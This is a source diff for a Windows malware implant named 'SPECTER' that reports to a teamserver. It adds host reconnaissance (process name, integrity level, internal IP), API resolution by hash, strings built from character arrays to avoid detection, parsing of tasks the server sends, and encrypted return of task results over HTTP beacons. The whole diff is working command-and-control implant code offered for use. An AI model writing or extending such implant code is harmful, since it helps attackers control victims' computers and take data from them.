@@ -14,6 +14,7 @@
 #include "comms.h"
 #include "profile.h"
 #include "transform.h"
+#include "task_exec.h"
 
 /* ------------------------------------------------------------------ */
 /*  Static state                                                       */
@@ -122,10 +123,13 @@ static void comms_dev_trace(const char *msg) {
 #define TLV_USERNAME         0x0011
 #define TLV_PID              0x0012
 #define TLV_OS_VERSION       0x0013
-#define TLV_INTEGRITY        0x0014
-#define TLV_PROCESS_NAME     0x0015
-#define TLV_INTERNAL_IP      0x0016
+#define TLV_PROCESS_NAME     0x0008
+#define TLV_INTEGRITY        0x0009
+#define TLV_INTERNAL_IP      0x000B
 #define TLV_TASK_RESULT      0x0020
+#define TLV_RESULT_TASK_ID   0x0021
+#define TLV_RESULT_STATUS    0x0022
+#define TLV_RESULT_DATA      0x0023
 
 /* Response TLV tags (server -> implant) */
 #define TLV_SESSION_ID       0x0100
@@ -261,6 +265,175 @@ static DWORD gather_os_version(char *buf, DWORD buf_len) {
     return pos;
 }
 
+/**
+ * Gather process name from PEB->Ldr->InLoadOrderModuleList.
+ * The first entry in load order is the exe itself; we extract BaseDllName.
+ * Returns length of process name (excluding null), 0 on failure.
+ */
+static DWORD gather_process_name(char *buf, DWORD buf_len) {
+    if (!buf || buf_len < 2) return 0;
+
+    /* TEB -> PEB -> Ldr -> InLoadOrderModuleList -> first entry -> BaseDllName */
+    PVOID teb;
+    __asm__ volatile ("mov %0, gs:[0x30]" : "=r" (teb));
+    PPEB peb = *(PPEB *)((PBYTE)teb + 0x60);
+    if (!peb || !peb->Ldr) return 0;
+
+    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
+    PLIST_ENTRY entry = head->Flink;
+    if (!entry || entry == head) return 0;
+
+    PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)entry;
+    UNICODE_STRING *name = &mod->BaseDllName;
+    if (!name->Buffer || name->Length == 0) return 0;
+
+    /* Convert wide string to narrow (ASCII subset) */
+    DWORD wlen = name->Length / sizeof(WCHAR);
+    DWORD out_len = (wlen < buf_len - 1) ? wlen : buf_len - 1;
+    for (DWORD i = 0; i < out_len; i++) {
+        WCHAR wc = name->Buffer[i];
+        buf[i] = (wc < 128) ? (char)wc : '?';
+    }
+    buf[out_len] = '\0';
+    return out_len;
+}
+
+/**
+ * Gather integrity level via NtOpenProcessToken + NtQueryInformationToken.
+ * Writes "Low", "Medium", "High", or "System" into buf.
+ * Returns length of string (excluding null), 0 on failure.
+ */
+static DWORD gather_integrity_level(char *buf, DWORD buf_len) {
+    if (!buf || buf_len < 8) return 0;
+
+    /* Resolve NtOpenProcessToken and NtQueryInformationToken from ntdll */
+    typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtOpenProcessToken)(
+        HANDLE ProcessHandle, DWORD DesiredAccess, HANDLE *TokenHandle);
+    typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtQueryInformationToken)(
+        HANDLE TokenHandle, DWORD TokenInformationClass,
+        PVOID TokenInformation, ULONG TokenInformationLength,
+        PULONG ReturnLength);
+    typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtClose)(HANDLE Handle);
+
+    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
+    if (!ntdll) return 0;
+
+    fn_NtOpenProcessToken pOpenToken =
+        (fn_NtOpenProcessToken)find_export_by_hash(ntdll, HASH_NTOPENPROCESSTOKEN);
+    fn_NtQueryInformationToken pQueryToken =
+        (fn_NtQueryInformationToken)find_export_by_hash(ntdll, HASH_NTQUERYINFORMATIONTOKEN);
+
+    fn_NtClose pClose = (fn_NtClose)find_export_by_hash(ntdll, HASH_NTCLOSE);
+
+    if (!pOpenToken || !pQueryToken || !pClose) return 0;
+
+    /* Open current process token with TOKEN_QUERY (0x0008) */
+    HANDLE token = NULL;
+    NTSTATUS status = pOpenToken((HANDLE)(LONG_PTR)-1, 0x0008, &token);
+    if (status != 0 || !token) return 0;
+
+    /* Query TokenIntegrityLevel (class 25) */
+    BYTE info_buf[64];
+    ULONG ret_len = 0;
+    status = pQueryToken(token, 25, info_buf, sizeof(info_buf), &ret_len);
+    pClose(token);
+    if (status != 0) return 0;
+
+    /* TOKEN_MANDATORY_LABEL: { SID_AND_ATTRIBUTES { PSID, DWORD } }
+     * PSID is at offset 0, pointing to a SID structure.
+     * The integrity RID is the last sub-authority of the SID.
+     * SID layout: Revision(1) SubAuthorityCount(1) Authority(6) SubAuthority[n](4 each)
+     */
+    PVOID psid = *(PVOID *)info_buf;
+    if (!psid) return 0;
+
+    BYTE *sid = (BYTE *)psid;
+    BYTE sub_count = sid[1];
+    if (sub_count == 0) return 0;
+
+    /* Last sub-authority is the integrity RID */
+    DWORD *sub_auths = (DWORD *)(sid + 8);
+    DWORD rid = sub_auths[sub_count - 1];
+
+    const char *level;
+    DWORD level_len;
+    if (rid >= 0x4000) {
+        /* S-y-s-t-e-m */
+        char s[] = {'S','y','s','t','e','m',0};
+        level = s; level_len = 6;
+        spec_memcpy(buf, level, level_len);
+    } else if (rid >= 0x3000) {
+        char s[] = {'H','i','g','h',0};
+        level = s; level_len = 4;
+        spec_memcpy(buf, level, level_len);
+    } else if (rid >= 0x2000) {
+        char s[] = {'M','e','d','i','u','m',0};
+        level = s; level_len = 6;
+        spec_memcpy(buf, level, level_len);
+    } else {
+        char s[] = {'L','o','w',0};
+        level = s; level_len = 3;
+        spec_memcpy(buf, level, level_len);
+    }
+    buf[level_len] = '\0';
+    return level_len;
+}
+
+/**
+ * Gather internal (non-loopback) IPv4 address via gethostname + gethostbyname.
+ * Writes dotted-quad string into buf. Returns length, 0 on failure.
+ */
+static DWORD gather_internal_ip(char *buf, DWORD buf_len) {
+    if (!buf || buf_len < 16) return 0;
+
+    /* Resolve gethostname and gethostbyname from ws2_32 */
+    typedef int (__attribute__((ms_abi)) *fn_gethostname)(char *, int);
+    typedef struct hostent *(__attribute__((ms_abi)) *fn_gethostbyname)(const char *);
+
+    PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
+    if (!ws2) return 0;
+
+    fn_gethostname pGetHostName =
+        (fn_gethostname)find_export_by_hash(ws2, HASH_GETHOSTNAME);
+    fn_gethostbyname pGetHostByName =
+        (fn_gethostbyname)find_export_by_hash(ws2, HASH_GETHOSTBYNAME);
+
+    if (!pGetHostName || !pGetHostByName) return 0;
+
+    char hostname[256];
+    if (pGetHostName(hostname, sizeof(hostname)) != 0) return 0;
+
+    /* struct hostent { char *h_name; char **h_aliases; short h_addrtype;
+     *                  short h_length; char **h_addr_list; } */
+    typedef struct {
+        char  *h_name;
+        char **h_aliases;
+        short  h_addrtype;
+        short  h_length;
+        char **h_addr_list;
+    } HOSTENT;
+
+    HOSTENT *he = (HOSTENT *)pGetHostByName(hostname);
+    if (!he || !he->h_addr_list) return 0;
+
+    /* Find first non-loopback IPv4 address */
+    for (int i = 0; he->h_addr_list[i]; i++) {
+        BYTE *addr = (BYTE *)he->h_addr_list[i];
+        if (addr[0] == 127) continue; /* Skip loopback */
+
+        /* Format as dotted quad: a.b.c.d */
+        DWORD pos = 0;
+        for (int octet = 0; octet < 4; octet++) {
+            if (octet > 0 && pos < buf_len) buf[pos++] = '.';
+            pos += uint_to_str((DWORD)addr[octet], buf + pos, buf_len - pos);
+        }
+        buf[pos] = '\0';
+        return pos;
+    }
+
+    return 0;
+}
+
 /* ------------------------------------------------------------------ */
 /*  TLV response parser                                                */
 /* ------------------------------------------------------------------ */
@@ -268,8 +441,10 @@ static DWORD gather_os_version(char *buf, DWORD buf_len) {
 /**
  * Parse a TLV-encoded checkin response from the teamserver.
  * Extracts SESSION_ID and iterates TASK_BLOCK entries.
+ * Parsed tasks are queued into impl_ctx->pending_tasks[].
  */
-static void parse_checkin_response(COMMS_CONTEXT *comms, const BYTE *data, DWORD len) {
+static void parse_checkin_response(IMPLANT_CONTEXT *impl_ctx, COMMS_CONTEXT *comms,
+                                    const BYTE *data, DWORD len) {
     if (len < 1 || data[0] != CHECKIN_TLV_VERSION) return;
 
     DWORD pos = 1;
@@ -283,10 +458,73 @@ static void parse_checkin_response(COMMS_CONTEXT *comms, const BYTE *data, DWORD
         case TLV_SESSION_ID:
             /* Store session ID for future checkins (optional) */
             break;
-        case TLV_TASK_BLOCK:
-            /* Parse nested task TLV — dispatch to task handler */
-            /* TODO: implement task execution */
+        case TLV_TASK_BLOCK: {
+            /* Parse nested task TLV: TASK_ID, TASK_TYPE, TASK_ARGS */
+            if (impl_ctx->pending_task_count >= MAX_PENDING_TASKS)
+                break;
+
+            TASK *t = &impl_ctx->pending_tasks[impl_ctx->pending_task_count];
+            spec_memset(t, 0, sizeof(TASK));
+
+            /* Iterate nested TLV within the TASK_BLOCK */
+            const BYTE *block = data + pos;
+            DWORD bpos = 0;
+            char type_buf[32];
+            DWORD type_len = 0;
+            spec_memset(type_buf, 0, sizeof(type_buf));
+
+            while (bpos + 4 <= vlen) {
+                WORD btag  = (WORD)block[bpos] | ((WORD)block[bpos + 1] << 8);
+                WORD blen  = (WORD)block[bpos + 2] | ((WORD)block[bpos + 3] << 8);
+                bpos += 4;
+                if (bpos + blen > vlen) break;
+
+                switch (btag) {
+                case TLV_TASK_ID: {
+                    DWORD copy = blen;
+                    if (copy > 63) copy = 63;
+                    spec_memcpy(t->task_id, block + bpos, copy);
+                    t->task_id[copy] = 0;
+                    break;
+                }
+                case TLV_TASK_TYPE: {
+                    DWORD copy = blen;
+                    if (copy > 31) copy = 31;
+                    spec_memcpy(type_buf, block + bpos, copy);
+                    type_buf[copy] = 0;
+                    type_len = copy;
+                    break;
+                }
+                case TLV_TASK_ARGS: {
+                    if (blen > 0) {
+                        t->data = (BYTE *)task_alloc(blen + 1);
+                        if (t->data) {
+                            spec_memcpy(t->data, block + bpos, blen);
+                            t->data[blen] = 0; /* null-terminate for string data */
+                            t->data_len = blen;
+                        }
+                    }
+                    break;
+                }
+                }
+                bpos += blen;
+            }
+
+            /* Convert task_type string to enum */
+            t->task_type = parse_task_type(type_buf, type_len);
+
+            /* Only queue if we got a valid task_id and type */
+            if (t->task_id[0] != 0 && t->task_type != 0) {
+                impl_ctx->pending_task_count++;
+            } else {
+                /* Invalid task — free any allocated data */
+                if (t->data) {
+                    task_free(t->data);
+                    t->data = NULL;
+                }
+            }
             break;
+        }
         }
         pos += vlen;
     }
@@ -980,13 +1218,13 @@ NTSTATUS comms_http_parse_response(const BYTE *data, DWORD data_len,
 /* ------------------------------------------------------------------ */
 
 /**
- * Build a TLV-encoded check-in payload with host information.
+ * Build a TLV-encoded check-in payload with host information and task results.
  * Wire format: [1-byte version = 0x01][TLV fields...]
  * Each TLV: [2-byte LE tag][2-byte LE length][value bytes]
  * Returns total payload size, or 0 on error.
  */
-static DWORD build_checkin_payload(IMPLANT_CONFIG *cfg, DWORD seq,
-                                    BYTE *out, DWORD out_len) {
+static DWORD build_checkin_payload(IMPLANT_CONTEXT *impl_ctx, IMPLANT_CONFIG *cfg,
+                                    DWORD seq, BYTE *out, DWORD out_len) {
     if (!cfg || !out || out_len < 64) return 0;
 
     DWORD pos = 0;
@@ -1021,7 +1259,76 @@ static DWORD build_checkin_payload(IMPLANT_CONFIG *cfg, DWORD seq,
     if (olen > 0)
         pos = tlv_put_str(out, pos, TLV_OS_VERSION, os_ver);
 
-    /* TODO: integrity level, process name, internal IP — add later */
+    /* Host info — process name (from PEB InLoadOrderModuleList) */
+    char proc_name[128];
+    DWORD plen = gather_process_name(proc_name, sizeof(proc_name));
+    if (plen > 0)
+        pos = tlv_put_str(out, pos, TLV_PROCESS_NAME, proc_name);
+
+    /* Host info — integrity level (via NtOpenProcessToken) */
+    char integrity[16];
+    DWORD ilen = gather_integrity_level(integrity, sizeof(integrity));
+    if (ilen > 0)
+        pos = tlv_put_str(out, pos, TLV_INTEGRITY, integrity);
+
+    /* Host info — internal IP (via gethostname + gethostbyname) */
+    char ip_buf[48];
+    DWORD iplen = gather_internal_ip(ip_buf, sizeof(ip_buf));
+    if (iplen > 0)
+        pos = tlv_put_str(out, pos, TLV_INTERNAL_IP, ip_buf);
+
+    /* Task results — include completed/failed task results from previous cycle.
+     * Each result is serialized as a nested TLV block (TASK_RESULT).
+     * Result data is capped at 0xFFF0 bytes to fit TLV u16 length field. */
+    if (impl_ctx) {
+        for (DWORD i = 0; i < impl_ctx->task_result_count; i++) {
+            TASK_RESULT *r = &impl_ctx->task_results[i];
+
+            /* Cap result data to fit in TLV u16 length, leaving room for
+             * the nested TASK_ID + STATUS headers (~100 bytes overhead) */
+            DWORD data_cap = r->data_len;
+            if (data_cap > 0xFF00) data_cap = 0xFF00;
+
+            /* Compute nested size: TASK_ID(4+id_len) + STATUS(4+8) + DATA(4+data_cap) */
+            DWORD id_len = spec_strlen(r->task_id);
+            DWORD nested_size = (4 + id_len) + (4 + 8) + (4 + data_cap);
+            if (nested_size > 0xFFFF) nested_size = 0xFFFF;
+
+            /* Check if there's room in the output buffer */
+            if (pos + 4 + nested_size > out_len) break;
+
+            /* Build nested TLV in-place: write TASK_RESULT header first
+             * with placeholder length, then fill, then fix length */
+            DWORD result_start = pos;
+            /* Reserve 4 bytes for TASK_RESULT TLV header */
+            pos += 4;
+
+            /* RESULT_TASK_ID */
+            pos = tlv_put_str(out, pos, TLV_RESULT_TASK_ID, r->task_id);
+
+            /* RESULT_STATUS: "COMPLETE" or "FAILED" */
+            {
+                char s_complete[] = {'C','O','M','P','L','E','T','E',0};
+                char s_failed[]   = {'F','A','I','L','E','D',0};
+                const char *status_str = (r->status == 0) ? s_complete : s_failed;
+                pos = tlv_put_str(out, pos, TLV_RESULT_STATUS, status_str);
+            }
+
+            /* RESULT_DATA */
+            if (r->data && data_cap > 0) {
+                pos = tlv_put(out, pos, TLV_RESULT_DATA, r->data, (WORD)data_cap);
+            } else {
+                pos = tlv_put(out, pos, TLV_RESULT_DATA, NULL, 0);
+            }
+
+            /* Patch the TASK_RESULT TLV header with actual nested length */
+            DWORD nested_len = pos - result_start - 4;
+            out[result_start]     = (BYTE)(TLV_TASK_RESULT & 0xFF);
+            out[result_start + 1] = (BYTE)(TLV_TASK_RESULT >> 8);
+            out[result_start + 2] = (BYTE)(nested_len & 0xFF);
+            out[result_start + 3] = (BYTE)(nested_len >> 8);
+        }
+    }
 
     return pos;
 }
@@ -1091,11 +1398,35 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     }
     COMMS_TRACE("[SPECTER] checkin: connected");
 
-    /* Build plaintext TLV payload */
+    /* Build plaintext TLV payload.
+     * When task results are pending, use a heap-allocated buffer large enough
+     * to hold the results. Otherwise use a small stack buffer. */
     COMMS_TRACE("[SPECTER] checkin: build_payload...");
-    BYTE payload[512];
-    DWORD payload_len = build_checkin_payload(cfg, comms->msg_seq, payload, sizeof(payload));
-    if (payload_len == 0) return STATUS_UNSUCCESSFUL;
+    BYTE payload_stack[512];
+    BYTE *payload = payload_stack;
+    DWORD payload_buf_size = sizeof(payload_stack);
+    BOOL payload_heap = FALSE;
+
+    if (ctx->task_result_count > 0) {
+        /* Estimate needed size: 512 base + per-result overhead + data */
+        DWORD needed = 512;
+        for (DWORD ri = 0; ri < ctx->task_result_count; ri++) {
+            needed += 128 + ctx->task_results[ri].data_len;
+        }
+        if (needed > 0xFFFF) needed = 0xFFFF; /* TLV u16 length cap */
+        BYTE *heap_buf = (BYTE *)task_alloc(needed);
+        if (heap_buf) {
+            payload = heap_buf;
+            payload_buf_size = needed;
+            payload_heap = TRUE;
+        }
+    }
+
+    DWORD payload_len = build_checkin_payload(ctx, cfg, comms->msg_seq, payload, payload_buf_size);
+    if (payload_len == 0) {
+        if (payload_heap) task_free(payload);
+        return STATUS_UNSUCCESSFUL;
+    }
     COMMS_TRACE("[SPECTER] checkin: payload built OK");
 
     BYTE http_buf[8192];
@@ -1111,14 +1442,20 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         status = transform_send(payload, payload_len, comms->session_key,
                                  &prof->transform, transformed, &transformed_len,
                                  sizeof(transformed));
-        spec_memset(payload, 0, sizeof(payload));
-        if (!NT_SUCCESS(status)) return status;
+        spec_memset(payload, 0, payload_buf_size);
+        if (!NT_SUCCESS(status)) {
+            if (payload_heap) task_free(payload);
+            return status;
+        }
 
         /* Step 2: profile_embed_data — embed into body template */
         BYTE body_buf[4096];
         DWORD body_len = profile_embed_data(prof, transformed, transformed_len,
                                              body_buf, sizeof(body_buf));
-        if (body_len == 0) return STATUS_UNSUCCESSFUL;
+        if (body_len == 0) {
+            if (payload_heap) task_free(payload);
+            return STATUS_UNSUCCESSFUL;
+        }
 
         /* Step 3: profile_build_headers — expand template headers */
         char headers_str[2048];
@@ -1134,28 +1471,50 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
             method, uri, ch->url,
             headers_str[0] ? headers_str : NULL,
             body_buf, body_len, http_buf, sizeof(http_buf));
-        if (http_len == 0) return STATUS_UNSUCCESSFUL;
+        if (http_len == 0) {
+            if (payload_heap) task_free(payload);
+            return STATUS_UNSUCCESSFUL;
+        }
 
     } else {
         /* ============== Legacy wire format path ============== */
         COMMS_TRACE("[SPECTER] checkin: legacy wire path");
-        spec_memset(payload, 0, sizeof(payload));
-        payload_len = build_checkin_payload(cfg, comms->msg_seq, payload, sizeof(payload));
+        spec_memset(payload, 0, payload_buf_size);
+        payload_len = build_checkin_payload(ctx, cfg, comms->msg_seq, payload, payload_buf_size);
 
         BYTE nonce[AEAD_NONCE_SIZE];
         generate_nonce(comms->msg_seq, cfg->implant_pubkey, nonce);
 
-        BYTE ciphertext[512];
+        /* Allocate ciphertext buffer to match payload size */
+        BYTE ct_stack[512];
+        BYTE *ciphertext = ct_stack;
+        BOOL ct_heap = FALSE;
+        if (payload_len > sizeof(ct_stack)) {
+            BYTE *ct_alloc = (BYTE *)task_alloc(payload_len);
+            if (ct_alloc) { ciphertext = ct_alloc; ct_heap = TRUE; }
+        }
+
         BYTE tag[AEAD_TAG_SIZE];
         spec_aead_encrypt(comms->session_key, nonce, payload, payload_len,
                            NULL, 0, ciphertext, tag);
-        spec_memset(payload, 0, sizeof(payload));
+        spec_memset(payload, 0, payload_buf_size);
 
         DWORD wire_body_len = COMMS_WIRE_HEADER_SIZE + payload_len + COMMS_WIRE_TAG_SIZE;
         DWORD wire_total = COMMS_WIRE_LEN_SIZE + wire_body_len;
 
-        BYTE wire_buf[1024];
-        if (wire_total > sizeof(wire_buf)) return STATUS_BUFFER_TOO_SMALL;
+        /* Allocate wire buffer to fit the full message */
+        BYTE wire_stack[1024];
+        BYTE *wire_buf = wire_stack;
+        BOOL wire_heap = FALSE;
+        if (wire_total > sizeof(wire_stack)) {
+            BYTE *wb = (BYTE *)task_alloc(wire_total);
+            if (wb) { wire_buf = wb; wire_heap = TRUE; }
+            else {
+                if (ct_heap) task_free(ciphertext);
+                if (payload_heap) task_free(payload);
+                return STATUS_BUFFER_TOO_SMALL;
+            }
+        }
 
         DWORD wp = 0;
         store32_le_comms(wire_buf + wp, wire_body_len); wp += 4;
@@ -1168,9 +1527,20 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         http_len = comms_http_build_request(
             COMMS_HTTP_POST, "/api/beacon", ch->url, NULL,
             wire_buf, wire_total, http_buf, sizeof(http_buf));
-        if (http_len == 0) return STATUS_UNSUCCESSFUL;
+
+        /* Free heap-allocated wire and ciphertext buffers */
+        if (wire_heap) task_free(wire_buf);
+        if (ct_heap) task_free(ciphertext);
+
+        if (http_len == 0) {
+            if (payload_heap) task_free(payload);
+            return STATUS_UNSUCCESSFUL;
+        }
         COMMS_TRACE("[SPECTER] checkin: HTTP request built, sending...");
     }
+
+    /* Payload no longer needed — free heap buffer before network I/O */
+    if (payload_heap) { task_free(payload); payload_heap = FALSE; }
 
     /* ---- Send request ---- */
     if (comms->state == COMMS_STATE_TLS_CONNECTED)
@@ -1227,7 +1597,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                                          resp_plain, &resp_plain_len,
                                          sizeof(resp_plain));
                 if (NT_SUCCESS(status) && resp_plain_len > 0) {
-                    parse_checkin_response(comms, resp_plain, resp_plain_len);
+                    parse_checkin_response(ctx, comms, resp_plain, resp_plain_len);
                 }
                 spec_memset(resp_plain, 0, sizeof(resp_plain));
             }
@@ -1246,12 +1616,18 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                                              resp_ct, resp_ct_len, NULL, 0,
                                              resp_plain, resp_tag);
                 if (ok) {
-                    parse_checkin_response(comms, resp_plain, resp_ct_len);
+                    parse_checkin_response(ctx, comms, resp_plain, resp_ct_len);
                 }
                 spec_memset(resp_plain, 0, sizeof(resp_plain));
             }
         }
     }
+
+    /* Free heap payload buffer if allocated */
+    if (payload_heap) task_free(payload);
+
+    /* Clear task results after successful transmission */
+    task_free_results(ctx);
 
     /* Success — increment counters */
     comms->msg_seq++;
